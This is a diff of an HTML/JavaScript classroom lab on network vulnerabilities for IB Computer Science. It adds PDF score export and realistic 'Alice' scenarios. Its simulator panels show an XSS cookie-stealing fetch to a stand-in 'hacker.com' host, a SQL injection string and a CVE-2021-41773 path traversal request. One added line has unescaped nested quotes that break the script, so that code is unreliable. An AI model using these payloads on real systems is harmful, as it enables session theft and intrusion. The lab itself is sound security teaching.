@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IB DP CS HL: Network Vulnerabilities Lab</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <style>
         :root {
             --bg: #0d1117; --panel: #161b22; --text: #c9d1d9; --accent: #58a6ff;
@@ -17,6 +18,7 @@
         .nav-item { padding: 10px 15px; cursor: pointer; border-left: 3px solid transparent; font-size: 0.85rem; color: #8b949e; }
         .nav-item:hover { background: rgba(88, 166, 255, 0.05); color: var(--text); }
         .nav-item.active { border-left-color: var(--accent); background: rgba(88, 166, 255, 0.15); color: var(--accent); font-weight: bold; }
+        .submit-tab { border-top: 1px solid #30363d; margin-top: 10px; color: var(--success); font-weight: bold;}
         
         /* Main Content */
         #content { flex-grow: 1; padding: 25px; overflow-y: auto; display: flex; flex-direction: column; }
@@ -24,14 +26,14 @@
         .module.active { display: flex; }
         h1 { color: var(--accent); border-bottom: 1px solid #30363d; padding-bottom: 10px; margin-top: 0; font-size: 1.4rem; }
         
-        /* Info Section (From Textbook) */
+        /* Info Section */
         .info-section { background: rgba(88, 166, 255, 0.05); border: 1px solid #30363d; border-left: 4px solid var(--accent); border-radius: 4px; padding: 15px; margin-bottom: 20px; font-size: 0.9rem; }
         .info-section strong { color: var(--accent); }
         .info-section p { margin: 5px 0; }
         .info-section .example { color: var(--warning); margin-top: 10px; display: block; }
         .info-section .counter { color: var(--success); margin-top: 10px; display: block; }
 
-        /* Two-Panel Layout (Simulator) */
+        /* Two-Panel Layout */
         .workspace { display: flex; gap: 20px; flex-grow: 1; margin-bottom: 15px; min-height: 200px;}
         .panel { background: var(--panel); border: 1px solid #30363d; border-radius: 6px; padding: 15px; flex: 1; display: flex; flex-direction: column; }
         .panel h3 { margin-top: 0; color: var(--warning); font-size: 0.9rem; border-bottom: 1px solid #30363d; padding-bottom: 5px; text-transform: uppercase; letter-spacing: 1px;}
@@ -56,6 +58,13 @@
         .feedback-correct { background: rgba(63, 185, 80, 0.2); color: var(--success); border: 1px solid var(--success); display: block;}
         .feedback-wrong { background: rgba(248, 81, 73, 0.2); color: var(--danger); border: 1px solid var(--danger); display: block;}
 
+        /* Submission Module */
+        .submit-box { text-align: center; padding: 40px; background: var(--panel); border: 2px solid var(--success); border-radius: 8px; margin-top: 20px;}
+        .submit-box h2 { color: var(--success); }
+        .download-btn { background: var(--success); color: #000; font-size: 1.2rem; padding: 15px 30px; margin-top: 20px; border: none;}
+        .download-btn:hover { background: #56d364; }
+        .results-list { text-align: left; background: #000; padding: 20px; border-radius: 6px; margin: 20px 0; color: var(--text); font-size: 0.9rem;}
+
         /* Syntax Highlighting */
         .t-red { color: var(--danger); font-weight: bold;}
         .t-green { color: var(--success); font-weight: bold;}
@@ -78,6 +87,7 @@
         <div class="nav-item" onclick="showMod('weakauth', this)">9. Weak Authentication</div>
         <div class="nav-item" onclick="showMod('zeroday', this)">10. Zero-Day Exploits</div>
         <div class="nav-item" onclick="showMod('combined', this)">11. How Attacks Combine</div>
+        <div class="nav-item submit-tab" onclick="showMod('submit', this)">12. Submit Results 📄</div>
     </div>
 
     <div id="content">
@@ -94,7 +104,7 @@
             <div class="workspace">
                 <div class="panel">
                     <h3>Attacker Botnet</h3>
-                    <div class="terminal" id="ddos-left">> Botnet armed and ready.<br>> Target: 192.168.1.10:80<br>> Awaiting command...</div>
+                    <div class="terminal" id="ddos-left">> Botnet armed and ready.<br>> Target: ticketmaster.com (Port 443)<br>> Awaiting command...</div>
                 </div>
                 <div class="panel">
                     <h3>Target Server State</h3>
@@ -129,14 +139,14 @@
             <div class="workspace">
                 <div class="panel">
                     <h3>Victim Transmission</h3>
-                    <div class="terminal" id="inc-left">> User submits login form.<br>> Protocol selected: <span class="t-red">HTTP (Port 80)</span><br>> Awaiting transmission...</div>
+                    <div class="terminal" id="inc-left">> Alice logs into her online bank using an unencrypted HTTP connection.<br>> Awaiting transmission...</div>
                 </div>
                 <div class="panel">
                     <h3>Attacker Wireshark Capture</h3>
-                    <div class="terminal" id="inc-right">> Interface eth0 in promiscuous mode.<br>> Sniffing for packets...</div>
+                    <div class="terminal" id="inc-right">> Interface wlan0 in promiscuous mode.<br>> Sniffing for packets...</div>
                 </div>
             </div>
-            <button id="inc-btn" onclick="nextInsecure()">Next Step: Transmit Packet</button>
+            <button id="inc-btn" onclick="nextInsecure()">Next Step: Alice submits her login</button>
 
             <div class="quiz-section">
                 <h3>Knowledge Check</h3>
@@ -164,11 +174,11 @@
             <div class="workspace">
                 <div class="panel">
                     <h3>Executable Payload</h3>
-                    <div class="terminal" id="mal-left">> payload.exe executed.<br>> Initializing cryptographic libraries...<br>> Generating AES-256 symmetric key...</div>
+                    <div class="terminal" id="mal-left">> Alice double-clicks "Invoice_2024.pdf.exe" attached to a fake email.<br>> Initializing cryptographic libraries...</div>
                 </div>
                 <div class="panel">
                     <h3>Victim File System</h3>
-                    <div class="terminal" id="mal-right">[FILE] thesis.docx | Hex: 0x48 0x65 0x6C 0x6C 0x6F<br>[FILE] photo.jpg   | Hex: 0xFF 0xD8 0xFF 0xE0</div>
+                    <div class="terminal" id="mal-right">[FILE] Family_Photo.jpg | Hex: 0xFF 0xD8 0xFF 0xE0<br>[FILE] Thesis_Final.docx | Hex: 0x48 0x65 0x6C 0x6C</div>
                 </div>
             </div>
             <button id="mal-btn" onclick="nextMalware()">Next Step: Encrypt Files</button>
@@ -199,7 +209,7 @@
             <div class="workspace">
                 <div class="panel">
                     <h3>Network Traffic Flow</h3>
-                    <div class="terminal" id="mitm-left">> Victim (192.168.1.50) wants to reach Gateway (192.168.1.1).<br>> Checking local ARP cache...</div>
+                    <div class="terminal" id="mitm-left">> Alice connects to "Free_Cafe_WiFi".<br>> Alice wants to send an email via mail.google.com.</div>
                 </div>
                 <div class="panel">
                     <h3>Victim's ARP Cache</h3>
@@ -234,7 +244,7 @@
             <div class="workspace">
                 <div class="panel">
                     <h3>Email Client Inbox</h3>
-                    <div class="terminal" id="phish-left">> You have 1 new email.<br><br><span class="t-yellow">From: PayPal Support &lt;support@paypa1.com&gt;</span><br><span class="t-yellow">Subject: URGENT: Account Suspended</span><br><br>Please click here to verify your identity.</div>
+                    <div class="terminal" id="phish-left">> You have 1 new email.<br><br><span class="t-yellow">From: Netflix Billing &lt;billing@netflix-update.com&gt;</span><br><span class="t-yellow">Subject: Payment Failed</span><br><br>Please click here to update your credit card details.</div>
                 </div>
                 <div class="panel">
                     <h3>Raw Email Headers</h3>
@@ -268,8 +278,8 @@
             </div>
             <div class="workspace">
                 <div class="panel">
-                    <h3>Backend Code (PHP)</h3>
-                    <div class="terminal">$user = $_POST['username'];<br>$pass = $_POST['password'];<br><br>$query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass';";</div>
+                    <h3>Backend Code (School Portal)</h3>
+                    <div class="terminal">$user = $_POST['student_id'];<br>$pass = $_POST['password'];<br><br>$query = "SELECT * FROM grades WHERE student_id = '$user' AND password = '$pass';";</div>
                 </div>
                 <div class="panel">
                     <h3>Attacker Input & Execution</h3>
@@ -303,12 +313,12 @@
             </div>
             <div class="workspace">
                 <div class="panel">
-                    <h3>Victim's Browser (Viewing Comment)</h3>
-                    <div class="terminal" id="xss-left">> Loading webpage...<br>> Rendering comments section...</div>
+                    <h3>Victim's Browser (Gaming Forum)</h3>
+                    <div class="terminal" id="xss-left">> Alice loads a thread on "best gaming PCs".<br>> Rendering comments...</div>
                 </div>
                 <div class="panel">
                     <h3>Backend Database (Comments)</h3>
-                    <div class="terminal" id="xss-right">ID: 1 | User: Bob | Comment: "Great post!"<br>ID: 2 | User: Eve | Comment: <span class="t-red">&lt;script&gt;stealCookies()&lt;/script&gt;</span></div>
+                    <div class="terminal" id="xss-right">ID: 1 | User: Bob | Comment: "Buy an RTX 4090!"<br>ID: 2 | User: Hacker | Comment: <span class="t-red">&lt;script&gt;fetch('http://hacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</span></div>
                 </div>
             </div>
             <button id="xss-btn" onclick="nextXSS()">Next Step: Victim Loads Page</button>
@@ -339,11 +349,11 @@
             <div class="workspace">
                 <div class="panel">
                     <h3>Attacker Terminal</h3>
-                    <div class="terminal" id="unp-left">> Searching Exploit-DB for target...<br>> Target: Apache HTTP Server 2.4.49<br>> Found: <span class="t-yellow">CVE-2021-41773 (Path Traversal)</span><br>> Preparing payload...</div>
+                    <div class="terminal" id="unp-left">> Searching Exploit-DB for target...<br>> Target: School's Web Server (Apache 2.4.49)<br>> Found: <span class="t-yellow">CVE-2021-41773 (Path Traversal)</span><br>> Preparing payload...</div>
                 </div>
                 <div class="panel">
                     <h3>Target Server Response</h3>
-                    <div class="terminal" id="unp-right">> Server version: 2.4.49<br>> Status: Running<br>> Awaiting malicious request...</div>
+                    <div class="terminal" id="unp-right">> Server version: 2.4.49<br>> Status: Running (Unpatched)<br>> Awaiting malicious request...</div>
                 </div>
             </div>
             <button id="unp-btn" onclick="nextUnpatched()">Next Step: Send Exploit Payload</button>
@@ -374,7 +384,7 @@
             <div class="workspace">
                 <div class="panel">
                     <h3>Attacker Dictionary Attack</h3>
-                    <div class="terminal" id="weak-left">> Wordlist loaded: rockyou.txt<br>> Target Hash: <span class="t-yellow">5f4dcc3b5aa765d61d8327deb882cf99</span><br>> Generating MD5 hashes for dictionary words...</div>
+                    <div class="terminal" id="weak-left">> Wordlist loaded: rockyou.txt (14 million passwords)<br>> Target: Admin Hash from leaked database<br>> Hash: <span class="t-yellow">5f4dcc3b5aa765d61d8327deb882cf99</span></div>
                 </div>
                 <div class="panel">
                     <h3>Comparison Logic</h3>
@@ -409,11 +419,11 @@
             <div class="workspace">
                 <div class="panel">
                     <h3>Defense Systems</h3>
-                    <div class="terminal" id="zero-left">> Antivirus: ACTIVE (Signatures up to date)<br>> Firewall: ACTIVE (Blocking known CVE traffic)<br>> System: FULLY PATCHED</div>
+                    <div class="terminal" id="zero-left">> Target: Government Database Server<br>> Antivirus: ACTIVE (Signatures up to date)<br>> Firewall: ACTIVE (Blocking known CVEs)<br>> System: FULLY PATCHED</div>
                 </div>
                 <div class="panel">
                     <h3>Attacker Payload</h3>
-                    <div class="terminal" id="zero-right">> Using unknown memory corruption flaw.<br>> Injecting shellcode via buffer overflow...<br>> Awaiting execution...</div>
+                    <div class="terminal" id="zero-right">> Using unknown memory corruption flaw in SQL service.<br>> Injecting custom shellcode...<br>> Awaiting execution...</div>
                 </div>
             </div>
             <button id="zero-btn" class="danger" onclick="nextZeroDay()">Next Step: Execute Zero-Day</button>
@@ -443,7 +453,7 @@
             <div class="workspace">
                 <div class="panel">
                     <h3>Attack Chain Timeline</h3>
-                    <div class="terminal" id="comb-left">> Awaiting attack sequence...</div>
+                    <div class="terminal" id="comb-left">> Target: TechCorp Network<br>> Awaiting attack sequence...</div>
                 </div>
                 <div class="panel">
                     <h3>Defense Systems</h3>
@@ -466,15 +476,51 @@
             </div>
         </div>
 
+        <!-- 12. SUBMIT RESULTS -->
+        <div id="submit" class="module">
+            <h1>12. Submit Your Results</h1>
+            <p style="font-size: 1.1rem; color: var(--warning);">You have reached the end of the lab. Please review your results and download the PDF to upload to ManageBac.</p>
+            
+            <div class="submit-box">
+                <h2>📄 Lab Report Ready</h2>
+                <p>Click the button below to generate and download your PDF report. It will contain your score and the number of attempts for each question.</p>
+                
+                <div id="summary-display" class="results-list">
+                    <!-- Summary injected here by JS -->
+                </div>
+
+                <button class="download-btn" onclick="downloadPDF()">Download PDF Report</button>
+            </div>
+        </div>
+
     </div>
 
     <script>
+        // --- STUDENT DATA TRACKING ---
+        const studentData = {
+            ddos: { name: '1. DDoS (SYN Flood)', attempts: 0, status: 'Not Attempted', answer: '' },
+            inc: { name: '2. Insecure Protocols', attempts: 0, status: 'Not Attempted', answer: '' },
+            mal: { name: '3. Malware (Ransomware)', attempts: 0, status: 'Not Attempted', answer: '' },
+            mitm: { name: '4. Man-in-the-Middle', attempts: 0, status: 'Not Attempted', answer: '' },
+            phish: { name: '5. Phishing', attempts: 0, status: 'Not Attempted', answer: '' },
+            sqli: { name: '6. SQL Injection', attempts: 0, status: 'Not Attempted', answer: '' },
+            xss: { name: '7. Cross-Site Scripting', attempts: 0, status: 'Not Attempted', answer: '' },
+            unp: { name: '8. Unpatched Software', attempts: 0, status: 'Not Attempted', answer: '' },
+            weak: { name: '9. Weak Authentication', attempts: 0, status: 'Not Attempted', answer: '' },
+            zero: { name: '10. Zero-Day', attempts: 0, status: 'Not Attempted', answer: '' },
+            comb: { name: '11. Attack Chain', attempts: 0, status: 'Not Attempted', answer: '' }
+        };
+
         // Navigation
         function showMod(id, el) {
             document.querySelectorAll('.module').forEach(m => m.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
             document.getElementById(id).classList.add('active');
             el.classList.add('active');
+
+            if (id === 'submit') {
+                updateSummaryUI();
+            }
         }
 
         // Quiz Logic
@@ -495,14 +541,88 @@
                 return;
             }
 
+            studentData[quizId].attempts += 1;
+            studentData[quizId].answer = selectedValue;
+
             if (selectedValue === correctAnswer) {
+                studentData[quizId].status = 'Correct';
                 feedbackDiv.className = 'quiz-feedback feedback-correct';
-                feedbackDiv.innerHTML = `✅ Correct!<br><span style="font-weight:normal; font-size:0.85rem; color:#c9d1d9;">${explanation}</span>`;
+                feedbackDiv.innerHTML = `✅ Correct! (Attempt ${studentData[quizId].attempts})<br><span style="font-weight:normal; font-size:0.85rem; color:#c9d1d9;">${explanation}</span>`;
+                radios.forEach(r => r.disabled = true); 
             } else {
+                studentData[quizId].status = 'Incorrect';
                 feedbackDiv.className = 'quiz-feedback feedback-wrong';
-                feedbackDiv.innerHTML = `❌ Incorrect. Try again.<br><span style="font-weight:normal; font-size:0.85rem; color:#c9d1d9;">Hint: Re-read the textbook definition above.</span>`;
+                feedbackDiv.innerHTML = `❌ Incorrect. (Attempt ${studentData[quizId].attempts})<br><span style="font-weight:normal; font-size:0.85rem; color:#c9d1d9;">Hint: Re-read the textbook definition above.</span>`;
             }
         }
+
+        // Summary UI
+        function updateSummaryUI() {
+            const summaryDiv = document.getElementById('summary-display');
+            let html = "";
+            
+            for (const key in studentData) {
+                const data = studentData[key];
+                const color = data.status === 'Correct' ? 'var(--success)' : (data.status === 'Incorrect' ? 'var(--danger)' : 'var(--text)');
+                html += `<div style="margin-bottom: 5px;">
+                    <strong>${data.name}:</strong> <span style="color: ${color}">${data.status}</span> (Attempts: ${data.attempts})
+                </div>`;
+            }
+            summaryDiv.innerHTML = html;
+        }
+
+        // PDF Generation
+        function downloadPDF() {
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+
+            doc.setFontSize(18);
+            doc.text("IB DP CS HL - Network Vulnerabilities Lab Report", 10, 20);
+            
+            doc.setFontSize(10);
+            const date = new Date().toLocaleString();
+            doc.text(`Date Generated: ${date}`, 10, 30);
+
+            doc.setLineWidth(0.5);
+            doc.line(10, 35, 200, 35);
+
+            let y = 45;
+            doc.setFontSize(12);
+            
+            let totalAttempts = 0;
+            let correctCount = 0;
+
+            for (const key in studentData) {
+                const data = studentData[key];
+                totalAttempts += data.attempts;
+                if (data.status === 'Correct') correctCount++;
+
+                doc.setFont(undefined, 'bold');
+                doc.text(data.name, 10, y);
+                doc.setFont(undefined, 'normal');
+                
+                let statusText = `Status: ${data.status} | Attempts: ${data.attempts}`;
+                if (data.answer) statusText += ` | Selected Option: ${data.answer}`;
+                
+                doc.text(statusText, 20, y + 7);
+                y += 18;
+
+                if (y > 270) {
+                    doc.addPage();
+                    y = 20;
+                }
+            }
+
+            doc.line(10, y, 200, y);
+            y += 10;
+            doc.setFont(undefined, 'bold');
+            doc.text(`Final Summary: ${correctCount} / 11 Correct`, 10, y);
+            doc.text(`Total Attempts Across All Questions: ${totalAttempts}`, 10, y + 7);
+
+            doc.save("Vulnerability_Lab_Results.pdf");
+        }
+
+        // --- SIMULATORS WITH REALISTIC SCENARIOS ---
 
         // 1. DDOS
         let ddosStep = 0;
@@ -512,12 +632,12 @@
             const btn = document.getElementById('ddos-btn');
             ddosStep++;
             if (ddosStep === 1) {
-                left.innerHTML = "> Sending 10,000 SYN packets with spoofed IPs...";
+                left.innerHTML = "> Sending 10,000 SYN packets from infected smart fridges...";
                 right.innerHTML = "> Server Backlog Queue: [ 1 / 5 ]<br>> [RECEIVED] SYN from IP 10.0.0.1 (Spoofed)<br>> [SENT] SYN-ACK to 10.0.0.1<br>> [WAITING] for ACK...";
                 btn.innerText = "Next Step: Flood Backlog Queue";
             } else if (ddosStep === 2) {
                 left.innerHTML += "<br>> Packets sent.";
-                right.innerHTML = "> Server Backlog Queue: <span class='t-red'>[ 5 / 5 ] (FULL)</span><br>> [RECEIVED] SYN from Legitimate User<br>> <span class='t-red'>[DROPPED] Connection reset. Queue full.</span>";
+                right.innerHTML = "> Server Backlog Queue: <span class='t-red'>[ 5 / 5 ] (FULL)</span><br>> [RECEIVED] SYN from Alice (Trying to buy concert tickets)<br>> <span class='t-red'>[DROPPED] Connection reset. Queue full.</span>";
                 btn.disabled = true;
             }
         }
@@ -530,11 +650,11 @@
             const btn = document.getElementById('inc-btn');
             incStep++;
             if (incStep === 1) {
-                left.innerHTML = "> Sending HTTP POST to bank.com...";
+                left.innerHTML = "> Alice submits her login details (HTTP)...";
                 right.innerHTML = "> Frame Captured (Port 80)<br>> Payload (Hex): 50 4F 53 54 20 ...<br>> Decoding ASCII...";
                 btn.innerText = "Next Step: View Cleartext Payload";
             } else if (incStep === 2) {
-                right.innerHTML = "> Frame Captured (Port 80)<br>> <span class='t-red'>POST /login HTTP/1.1<br>username=admin&password=SuperSecretPass123</span>";
+                right.innerHTML = "> Frame Captured (Port 80)<br>> <span class='t-red'>POST /login HTTP/1.1<br>username=alice_99&password=MyCatFluffy1</span>";
                 btn.disabled = true;
             }
         }
@@ -547,8 +667,8 @@
             const btn = document.getElementById('mal-btn');
             malStep++;
             if (malStep === 1) {
-                left.innerHTML = "> Key generated: A1B2C3D4E5...<br>> Encrypting files...";
-                right.innerHTML = "[FILE] thesis.docx | Hex: <span class='t-red'>0x9F 0x2A 0x1B 0x8C 0x7D</span><br>[FILE] photo.jpg | Hex: <span class='t-red'>0x4E 0x8F 0x1A 0x2B 0x9C</span><br>> Files encrypted.";
+                left.innerHTML = "> Key generated: A1B2C3D4E5...<br>> Scanning user directories for files...";
+                right.innerHTML = "[FILE] Family_Photo.jpg | Hex: <span class='t-red'>0x9F 0x2A 0x1B 0x8C 0x7D</span><br>[FILE] Thesis_Final.docx | Hex: <span class='t-red'>0x4E 0x8F 0x1A 0x2B 0x9C</span><br>> Files encrypted.";
                 btn.innerText = "Next Step: Delete Originals & Ransom";
             } else if (malStep === 2) {
                 left.innerHTML += "<br>> Original files securely deleted.";
@@ -567,9 +687,9 @@
             if (mitmStep === 1) {
                 left.innerHTML = "> <span class='t-red'>[ATTACKER] Sends ARP Reply: '192.168.1.1 is at 00:AA:BB:CC:DD:EE'</span>";
                 right.innerHTML = "IP Address       MAC Address<br>192.168.1.1      <span class='t-red'>00:AA:BB:CC:DD:EE (POISONED!)</span><br>192.168.1.99     00:AA:BB:CC:DD:EE";
-                btn.innerText = "Next Step: Victim Sends Traffic";
+                btn.innerText = "Next Step: Victim Sends Email";
             } else if (mitmStep === 2) {
-                left.innerHTML += "<br>> Victim sends packet to Gateway...<br>> <span class='t-red'>Traffic routed to Attacker's MAC instead.</span>";
+                left.innerHTML += "<br>> Alice sends an email to her boss.<br>> <span class='t-red'>Traffic routed to Attacker's laptop. Attacker reads: 'I quit.'</span>";
                 btn.disabled = true;
             }
         }
@@ -581,7 +701,7 @@
             const btn = document.getElementById('phish-btn');
             phishStep++;
             if (phishStep === 1) {
-                right.innerHTML = "Return-Path: &lt;bounce@malicious.ru&gt;<br>Received-SPF: <span class='t-red'>fail</span> (not permitted)<br>Authentication-Results:<br>  <span class='t-red'>dkim=fail</span><br>  <span class='t-red'>dmarc=fail</span><br><br>> <span class='t-yellow'>WARNING: Spoofed sender detected.</span>";
+                right.innerHTML = "Return-Path: &lt;bounce@phishing-site.xyz&gt;<br>Received-SPF: <span class='t-red'>fail</span> (not permitted)<br>Authentication-Results:<br>  <span class='t-red'>dkim=fail</span><br>  <span class='t-red'>dmarc=fail</span><br><br>> <span class='t-yellow'>WARNING: Spoofed sender detected. The email is NOT from Netflix.</span>";
                 btn.disabled = true;
             }
         }
@@ -593,10 +713,10 @@
             const btn = document.getElementById('sqli-btn');
             sqliStep++;
             if (sqliStep === 1) {
-                right.innerHTML = "> Input User: admin<br>> Input Pass: <span class='t-red'>' OR '1'='1</span><br><br>> Executing:<br><span class='t-blue'>SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';</span>";
+                right.innerHTML = "> Input Student ID: admin<br>> Input Password: <span class='t-red'>' OR '1'='1</span><br><br>> Executing:<br><span class='t-blue'>SELECT * FROM grades WHERE student_id = 'admin' AND password = '' OR '1'='1';</span>";
                 btn.innerText = "Next Step: Database Parses Logic";
             } else if (sqliStep === 2) {
-                right.innerHTML += "<br><br>> Logic: '1'='1' is ALWAYS TRUE.<br>> <span class='t-green'>Query returns TRUE. Login Successful.</span>";
+                right.innerHTML += "<br><br>> Logic: '1'='1' is ALWAYS TRUE.<br>> <span class='t-green'>Query returns TRUE. Attacker can now view all student grades and modify them.</span>";
                 btn.disabled = true;
             }
         }
@@ -608,7 +728,7 @@
             const btn = document.getElementById('xss-btn');
             xssStep++;
             if (xssStep === 1) {
-                left.innerHTML = "> Rendering Comment ID 2...<br>> Browser executes: <span class='t-red'>&lt;script&gt;stealCookies()&lt;/script&gt;</span><br>> <span class='t-red'>Cookie sent to attacker's server!</span>";
+                left.innerHTML = "> Alice's browser executes the comment script...<br>> <span class='t-red'>&lt;script&gt;fetch('http://hacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</span><br>> <span class='t-red'>Alice's active session cookie for the gaming forum is sent to the hacker!</span>";
                 btn.disabled = true;
             }
         }
@@ -620,7 +740,7 @@
             const btn = document.getElementById('unp-btn');
             unpStep++;
             if (unpStep === 1) {
-                right.innerHTML = "> GET /cgi-bin/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1<br>> Processing...<br>> <span class='t-red'>HTTP/1.1 200 OK. File Contents: root:x:0:0...</span><br>> <span class='t-red'>Exploit Successful.</span>";
+                right.innerHTML = "> GET /cgi-bin/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1<br>> Processing...<br>> <span class='t-red'>HTTP/1.1 200 OK. File Contents: root:x:0:0...</span><br>> <span class='t-red'>Exploit Successful. Attacker now has a list of all system users.</span>";
                 btn.disabled = true;
             }
         }
@@ -632,7 +752,7 @@
             const btn = document.getElementById('weak-btn');
             weakStep++;
             if (weakStep === 1) {
-                left.innerHTML = "> Testing word: '123456' -> Hash: e10adc... (No match)<br>> Testing word: 'password' -> Hash: <span class='t-green'>5f4dcc... (Match found!)</span><br>> <span class='t-green'>Password cracked: 'password'</span>";
+                left.innerHTML = "> Testing word: '123456' -> Hash: e10adc... (No match)<br>> Testing word: 'password' -> Hash: <span class='t-green'>5f4dcc... (Match found!)</span><br>> <span class='t-green'>Admin password cracked: 'password'</span>";
                 btn.disabled = true;
             }
         }
@@ -646,7 +766,7 @@
             zeroStep++;
             if (zeroStep === 1) {
                 left.innerHTML = "> <span class='t-red'>AV Signature Match: 0% (Unknown threat)</span><br>> <span class='t-red'>Firewall: Exploit traffic bypassed</span><br>> <span class='t-red'>SYSTEM COMPROMISED.</span>";
-                right.innerHTML = "> Shellcode executed.<br>> Remote Code Execution (RCE) achieved.<br>> Reverse shell established.";
+                right.innerHTML = "> Shellcode executed.<br>> Remote Code Execution (RCE) achieved.<br>> Downloading classified government files...";
                 btn.disabled = true;
             }
         }
@@ -660,15 +780,15 @@
             combStep++;
             
             if (combStep === 1) {
-                left.innerHTML = "<span class='t-yellow'>[PHASE 1: INITIAL ACCESS]</span><br>> Sending phishing email...<br>> User clicks link and enters credentials.<br>> <span class='t-red'>Credentials stolen.</span>";
+                left.innerHTML = "<span class='t-yellow'>[PHASE 1: INITIAL ACCESS]</span><br>> Sending fake "HR Salary Update" email...<br>> Employee clicks link and enters their company login.<br>> <span class='t-red'>Credentials stolen.</span>";
                 right.innerHTML = "> MFA: DISABLED<br>> Patch Level: OUTDATED<br>> Antivirus: ACTIVE";
                 btn.innerText = "Next Step: Exploit Unpatched Software";
             } else if (combStep === 2) {
-                left.innerHTML += "<br><br><span class='t-yellow'>[PHASE 2: PRIVILEGE ESCALATION]</span><br>> Using stolen credentials to login.<br>> Exploiting unpatched CVE-2023-1234 on server...<br>> <span class='t-red'>Root access achieved.</span>";
+                left.innerHTML += "<br><br><span class='t-yellow'>[PHASE 2: PRIVILEGE ESCALATION]</span><br>> Using stolen credentials to login to the internal server.<br>> Exploiting unpatched CVE-2023-1234 on the HR portal...<br>> <span class='t-red'>Root access achieved.</span>";
                 right.innerHTML = "> MFA: DISABLED<br>> <span class='t-red'>Patch Level: EXPLOITED</span><br>> Antivirus: ACTIVE";
                 btn.innerText = "Next Step: Deploy Malware";
             } else if (combStep === 3) {
-                left.innerHTML += "<br><br><span class='t-yellow'>[PHASE 3: IMPACT]</span><br>> Deploying ransomware payload.<br>> Encrypting database files...<br>> <span class='t-red'>Attack Successful. Ransom demanded.</span>";
+                left.innerHTML += "<br><br><span class='t-yellow'>[PHASE 3: IMPACT]</span><br>> Deploying ransomware payload.<br>> Encrypting the company's financial database...<br>> <span class='t-red'>Attack Successful. Ransom demanded.</span>";
                 right.innerHTML = "> MFA: DISABLED<br>> Patch Level: EXPLOITED<br>> <span class='t-red'>Antivirus: BYPASSED</span>";
                 btn.innerText = "Chain Complete";
                 btn.disabled = true;
